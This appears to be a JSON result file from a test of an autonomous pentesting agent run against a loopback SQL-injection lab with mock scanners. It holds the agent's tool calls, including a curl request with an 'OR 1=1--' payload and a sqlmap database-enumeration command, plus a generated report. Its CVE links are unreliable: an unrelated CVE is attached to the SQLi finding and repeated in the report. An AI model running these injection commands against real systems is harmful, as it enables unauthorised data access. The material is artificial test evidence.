@@ -1,0 +1,250 @@
+{
+  "checks": {
+    "cveContextEvidence": "PASS",
+    "httpProbeEvidence": "PASS",
+    "modelContinuedAfterTools": "PASS",
+    "modelReceivedWebToolSchemas": "PASS",
+    "nucleiEvidence": "PASS",
+    "orderedToolSequence": "PASS",
+    "rawResultEvidence": "PASS",
+    "reportGeneratedFromEvidence": "PASS",
+    "safeLocalBoundary": "PASS",
+    "sqlInjectionProof": "PASS",
+    "terminalTranscripts": "PASS",
+    "verboseToolTranscript": "PASS",
+    "webSurfaceEvidence": "PASS"
+  },
+  "expectedToolSequence": [
+    "run_shell",
+    "httpx",
+    "nuclei",
+    "sqlmap",
+    "search_cve"
+  ],
+  "finishedAt": "2026-07-06T00:51:05-0700",
+  "generatedAt": "2026-07-06T00:51:05-0700",
+  "labUrl": "http://127.0.0.1:50175",
+  "messages": [
+    {
+      "content": "Authorized local webserver lab only. Use run_shell, httpx, nuclei, sqlmap, and search_cve against this loopback target only: http://127.0.0.1:50175. Surface routes, probe the web app, prove the q parameter SQL injection with local fixture evidence, then summarize with WEBAPP_SQLI_FINAL.",
+      "role": "user"
+    },
+    {
+      "content": "Starting local web app auth and SQL injection workflow.",
+      "contextPreview": "## Dynamic Context Catalogue\nPolicy: selected 0 of 0 indexed items for phase SCAN, tab web.\nBudget: max 6000 chars, max 8 selected snippets.\nUse search_context for more targeted notes, assets, findings, tool output, or CVEs instead of requesting all context in the prompt.\nCounts: ports=0 subdomains=0 web=0 vulns=0 network=0 osint=0 stash=0 cves=0\nSelected snippets: none yet.\nCVE assist: semantic embedding search is enabled when cve_embedder.py and stored CVE embeddings are available; otherwise C",
+      "contextSnippetCount": 0,
+      "role": "assistant",
+      "toolSchemaCount": 34,
+      "toolSchemas": [
+        "search_cve",
+        "lookup_cve",
+        "search_context",
+        "run_shell",
+        "sqlmap",
+        "nuclei",
+        "httpx",
+        "ffuf",
+        "wpscan",
+        "arjun",
+        "graphqlmap",
+        "katana",
+        "feroxbuster",
+        "dalfox",
+        "testssl",
+        "jwt_tool",
+        "nmap",
+        "hashcat",
+        "pwncat",
+        "gowitness",
+        "dnsx",
+        "hydra",
+        "osv_scanner",
+        "metasploit",
+        "linpeas",
+        "sherlock",
+        "masscan",
+        "theharvester",
+        "grype",
+        "holehe",
+        "netexec",
+        "tshark",
+        "chisel",
+        "syft"
+      ]
+    },
+    {
+      "content": "Tool request: run_shell\n$ /bin/zsh -c curl -sS http://127.0.0.1:50175/routes && curl -sS 'http://127.0.0.1:50175/search?q=1%27%20OR%201%3D1--'\nArguments:\n{\n  \"command\" : \"curl -sS http:\\/\\/127.0.0.1:50175\\/routes && curl -sS 'http:\\/\\/127.0.0.1:50175\\/search?q=1%27%20OR%201%3D1--'\"\n}\n\nGET /\nGET /login\nGET /search?q=1\nEXPLOITBOT_SQLI_PROOF_USER=alice\nparameter=q\n",
+      "role": "toolCall",
+      "status": "ok 0.0s",
+      "tool": "run_shell"
+    },
+    {
+      "content": "Tool request: httpx\n$ /bin/sh -c echo 'http://127.0.0.1:50175' | tr ',' '\\n' | httpx -sc -title -tech-detect -json -silent -duc -timeout 5 2>/dev/null || curl -s -o /dev/null -w '{\"url\":\"http://127.0.0.1:50175\",\"status_code\":%{http_code},\"title\":\"\",\"webserver\":\"%{content_type}\"}' 'http://127.0.0.1:50175'\nArguments:\n{\n  \"status_code\" : true,\n  \"targets\" : \"http:\\/\\/127.0.0.1:50175\",\n  \"tech_detect\" : true,\n  \"title\" : true\n}\n\n{\"timestamp\":\"2026-07-06T00:51:05.290523-07:00\",\"port\":\"50175\",\"url\":\"http://127.0.0.1:50175\",\"input\":\"http://127.0.0.1:50175\",\"title\":\"ExploitBot SQLi Lab\",\"scheme\":\"http\",\"webserver\":\"BaseHTTP/0.6 Python/3.14.6\",\"content_type\":\"text/html\",\"method\":\"GET\",\"host\":\"127.0.0.1\",\"host_ip\":\"127.0.0.1\",\"path\":\"/\",\"time\":\"360.375\u00b5s\",\"a\":[\"127.0.0.1\"],\"tech\":[\"Python:3.14.6\"],\"words\":3,\"lines\":1,\"status_code\":200,\"content_length\":72,\"failed\":false,\"knowledgebase\":{\"pHash\":0}}\n",
+      "role": "toolCall",
+      "status": "ok 0.3s",
+      "tool": "httpx"
+    },
+    {
+      "content": "Tool request: nuclei\n$ nuclei -u http://127.0.0.1:50175 -t webserver-auth-sqli-local -jsonl -silent\nArguments:\n{\n  \"target\" : \"http:\\/\\/127.0.0.1:50175\",\n  \"templates\" : \"webserver-auth-sqli-local\"\n}\n\n{\"template-id\": \"webserver-auth-sqli-local\", \"matched-at\": \"http://127.0.0.1:50175/search?q=1\", \"host\": \"http://127.0.0.1:50175\", \"info\": {\"name\": \"Local SQL injection proof\", \"severity\": \"high\", \"description\": \"Loopback SQL injection proof for q parameter.\", \"classification\": {\"cve-id\": \"CVE-2021-41773\"}, \"tags\": [\"sqli\", \"local-fixture\"]}}\n",
+      "role": "toolCall",
+      "status": "ok 0.0s",
+      "tool": "nuclei"
+    },
+    {
+      "content": "Tool request: sqlmap\n$ sqlmap -u http://127.0.0.1:50175/search?q=1 --batch --level 2 --risk 1 --dbs\nArguments:\n{\n  \"dbs\" : true,\n  \"level\" : 2,\n  \"risk\" : 1,\n  \"url\" : \"http:\\/\\/127.0.0.1:50175\\/search?q=1\"\n}\n\n[INFO] testing GET parameter 'q'\nParameter: q (GET)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause\nEXPLOITBOT_SQLI_PROOF_USER=alice\navailable databases [1]:\n[*] exploitbot_lab\n",
+      "role": "toolCall",
+      "status": "ok 0.0s",
+      "tool": "sqlmap"
+    },
+    {
+      "content": "Tool request: search_cve\n$ echo handled by callback\nArguments:\n{\n  \"max_results\" : 5,\n  \"product\" : \"apache\",\n  \"query\" : \"CVE-2021-41773 SQL injection\"\n}\n\nFound 1 CVEs:\n\nCVE-2021-40438 [HIGH] CVSS:0.0 | apache apache\n  Tags: kev,actively-exploited\n  Sources: cisa-kev, nvd, tags\n  Exploit: YES (weaponized) | CISA KEV: YES\n  Description: A crafted request uri-path can cause mod_proxy to forward the request to an origin server choosen by the remote user. This issue affects Apache HTTP Server 2.4.48 and earlier. Required action: Apply updates per vendor instructions.\n\n",
+      "role": "toolCall",
+      "status": "ok 0.1s",
+      "tool": "search_cve"
+    },
+    {
+      "content": "WEBAPP_SQLI_FINAL: discovered the loopback web app, probed httpx/nuclei, validated SQL injection on GET parameter q with sqlmap-style evidence, and queued report evidence from the local fixture only.",
+      "contextPreview": "## Dynamic Context Catalogue\nPolicy: selected 4 of 7 indexed items for phase SCAN, tab supplyChain.\nBudget: max 6000 chars, max 8 selected snippets.\nUse search_context for more targeted notes, assets, findings, tool output, or CVEs instead of requesting all context in the prompt.\nCounts: ports=0 subdomains=0 web=1 vulns=1 network=0 osint=0 stash=0 cves=0\nSelected snippets:\n- [finding] HIGH webserver-auth-sqli-local tags=vuln,high,nuclei,sqli,local-fixture,CVE-2021-41773: target http://127.0.0.1:",
+      "contextSelections": [
+        {
+          "bodyHash": "5575fb2121f513fa",
+          "source": "finding",
+          "tags": "vuln,high,nuclei,sqli,local-fixture,CVE-2021-41773",
+          "title": "HIGH webserver-auth-sqli-local"
+        },
+        {
+          "bodyHash": "bd18b6613ba52f7f",
+          "source": "tool.output",
+          "tags": "tool,nuclei",
+          "title": "nuclei"
+        },
+        {
+          "bodyHash": "dfd4539d9469ea04",
+          "source": "tool.output",
+          "tags": "tool,httpx",
+          "title": "httpx"
+        },
+        {
+          "bodyHash": "b638b88442624ca1",
+          "source": "asset.web",
+          "tags": "web,BaseHTTP/0.6 Python/3.14.6,Python:3.14.6",
+          "title": "http://127.0.0.1:50175"
+        }
+      ],
+      "contextSnippetCount": 4,
+      "role": "assistant"
+    }
+  ],
+  "notes": [
+    "Scenario uses a loopback webserver and deterministic local scanner shims on isolated PATH.",
+    "The SQL injection validation is a local fixture proof marker, not an external target exploit.",
+    "This proves app orchestration, verbose transcript, parser/raw result ingestion, and report route wiring."
+  ],
+  "ok": true,
+  "proofLevel": "live-app-mock-engine-real-tool-executor-fake-local-web-scanners",
+  "proofType": "webserver-auth-sqli-scenario-live",
+  "reportRenderActions": {
+    "findingCount": 1,
+    "htmlChars": 3273,
+    "htmlPreview": "<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"UTF-8\">\n<style>\nbody { font-family: Georgia, serif; font-size: 13px; line-height: 1.7; color: #1a1a1a; max-width: 800px; margin: 40px auto; padding: 0 20px; }\nh1 { font-family: -apple-system, sans-serif; font-size: 22px; margin-bottom: 4px; }\nh2 { font-family: -apple-system, sans-serif; font-size: 16px; margin-top: 24px; border-bottom: 1px solid #ddd; padding-bottom: 4px; }\nh3 { font-family: -apple-system, sans-serif; font-size: 14px; margin-top: 16px; }\n.confidential { text-align: center; font-family: monospace; font-size: 10px; letter-spacing: 3px; color: #999; text-transform: uppercase; margin-bottom: 30px; }\n.meta { font-size: 11px; color: #888; font-family: monospace; margin-bottom: 20px; }\ntable { width: 100%; border-collapse: collapse; font-size: 12px; margin: 10px 0; }\nth { background: #f5f5f5; border-bottom: 2px solid #ddd; padding: 6px 10px; text-align: left; font-family: -apple-system, sans-serif; }\ntd { padding: 6px 10px; border-bottom: 1px solid #eee; }\n.finding { border: 1px solid #ddd; border-radius: 6px; padding: 12px; margin: 10px 0; }\n.finding.critical { border-left: 4px solid #ef4444; }\n.finding.high { border-left: 4px solid #f97316; }\n.finding.medium { border-left: 4px solid #f59e0b; }\n.finding.low { border-left: 4px solid #3b82f6; }\n.sev { font-family: monospace; font-size: 10px; font-weight: bold; padding: 1px 6px; border-radius: 3px; }\n.sev.critical { background: #fef2f2; color: #dc2626; }\n.sev.high { background: #fff7ed; color: #ea580c; }\n.sev.medium { background: #fffbeb; color: #d97706; }\n.sev.low { background: #eff6ff; color: #2563eb; }\ncode { font-family: monospace; font-size: 11px; background: #f0f0f0; padding: 1px 4px; border-radius: 2px; }\n@media print { body { margin: 0; } .finding { break-inside: avoid; } }\n</style>\n</head>\n<body>\n<div class=\"confidential\">CONFIDENTIAL</div>\n<h1>Penetration Test Report</h1>\n<div class=\"meta\">\nClient: Unknown<br>\nAssessment Date: July 6, 2026<br>\nAssessor: exploitbot (autonomous)<br>\nClassification: Confidential\n</div>\n\n<h2>1. Executive Summary</h2>\n<p>A penetration test was conducted against <strong>Unknown</strong>. The assessment identified <strong>1 vulnerabilities</strong> including 0 critical, 1 high, 0 medium, and 0 low severity findings.</p>\n\n<h2>2. Findings Summary</h2>\n<table>\n<tr><th>#</th><th>Finding</th><th>Severity</th><th>CVSS</th><th>Target</th><th>Status</th></tr>\n<tr><td>1</td><td>SQL injection in local search parameter</td><td><span class=\"sev high\">HIGH</span></td><td>8.1</td><td><code>http://127.0.0.1:50175/search?q=1</code></td><td>confirmed</td></tr>\n</table>\n\n<h2>3. Detailed Findings</h2>\n<div class=\"finding high\">\n<h3><span class=\"sev high\">HIGH</span> SQL injection in local search parameter</h3>\n<p><strong>Target:</strong> <code>http://127.0.0.1:50175/search?q=1</code></p>\n<p><strong>CVSS:</strong> 8.1</p>\n<p><strong>CVE:</strong> CVE-2021-41773</p>\n<p><strong>Description:</strong> The local fixture search endpoint exposes SQL injection evidence in the q parameter.</p>\n<h3>Impact</h3><p>An attacker could alter query logic and extract application data.</p>\n<h3>Remediation</h3><p>Use parameterized queries and add regression coverage for q input handling.</p>\n</div>\n\n</body>\n</html>",
+    "lastAction": "generate",
+    "status": "done",
+    "summary": "generateReport 1 findings",
+    "template": "Full Pentest Report"
+  },
+  "resultsSummary": {
+    "rawResultCount": 5,
+    "rawTools": [
+      "run_shell",
+      "httpx",
+      "nuclei",
+      "sqlmap",
+      "search_cve"
+    ],
+    "vulnCount": 1,
+    "vulnSources": [
+      "nuclei"
+    ],
+    "webHostCount": 0
+  },
+  "scenarioId": "webserver_auth_sqli_report_chain",
+  "stageEvidence": {
+    "evidence": [
+      "/messages tool cards",
+      "/results rawResults/vulns",
+      "/state terminal transcripts"
+    ],
+    "exploit_or_validate": [
+      "bounded local validation only; no external targets"
+    ],
+    "probe": [
+      "nuclei local template",
+      "sqlmap local query parameter test"
+    ],
+    "prove": [
+      "q parameter SQL injection proof marker",
+      "nuclei structured finding"
+    ],
+    "report": [
+      "/qa/finding-wizard-submit",
+      "/qa/report-generate-action"
+    ],
+    "surface": [
+      "run_shell route inventory",
+      "httpx local web probe"
+    ]
+  },
+  "stages": [
+    "surface",
+    "probe",
+    "prove",
+    "exploit_or_validate",
+    "evidence",
+    "report"
+  ],
+  "startedAt": "2026-07-06T00:51:02-0700",
+  "status": "PASS",
+  "toolSchemaNames": [
+    "arjun",
+    "chisel",
+    "dalfox",
+    "dnsx",
+    "feroxbuster",
+    "ffuf",
+    "gowitness",
+    "graphqlmap",
+    "grype",
+    "hashcat",
+    "holehe",
+    "httpx",
+    "hydra",
+    "jwt_tool",
+    "katana",
+    "linpeas",
+    "lookup_cve",
+    "masscan",
+    "metasploit",
+    "netexec",
+    "nmap",
+    "nuclei",
+    "osv_scanner",
+    "pwncat",
+    "run_shell",
+    "search_context",
+    "search_cve",
+    "sherlock",
+    "sqlmap",
+    "syft",
+    "testssl",
+    "theharvester",
+    "tshark",
+    "wpscan"
+  ],
+  "toolSequence": [
+    "run_shell",
+    "httpx",
+    "nuclei",
+    "sqlmap",
+    "search_cve"
+  ]
+}
